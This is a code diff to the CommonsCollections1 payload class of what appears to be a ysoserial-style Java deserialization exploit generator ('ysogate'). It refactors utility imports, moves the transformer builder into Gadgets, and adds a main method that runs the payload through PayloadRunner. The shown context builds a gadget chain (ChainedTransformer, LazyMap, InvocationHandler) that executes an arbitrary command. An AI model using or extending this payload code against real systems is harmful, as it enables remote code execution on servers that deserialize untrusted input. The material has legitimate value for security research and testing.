@@ -4,6 +4,7 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -12,10 +13,9 @@ import org.apache.commons.collections.map.LazyMap;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.JavaVersion;
-import A.R.ysogate.payloads.util.Reflections;
-import A.R.ysogate.payloads.util.TransformerUtil;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.JavaVersion;
+import A.R.ysogate.payloads.utils.Reflections;
 
 /*
 	Gadget chain:
@@ -48,7 +48,7 @@ public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 		final Transformer transformerChain = new ChainedTransformer(
 				new Transformer[]{new ConstantTransformer(1)});
 		// real chain for after setup
-		final Transformer[] transformers = TransformerUtil.makeTransformer(command);
+		final Transformer[] transformers = Gadgets.makeTransformer(command);
 
 		final Map               innerMap = new HashMap();
 		final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
@@ -60,6 +60,9 @@ public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
 		return handler;
 	}
 
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections1.class, args);
+	}
 	public static boolean isApplicableJavaVersion() {
 		return JavaVersion.isAnnInvHUniversalMethodImpl();
 	}
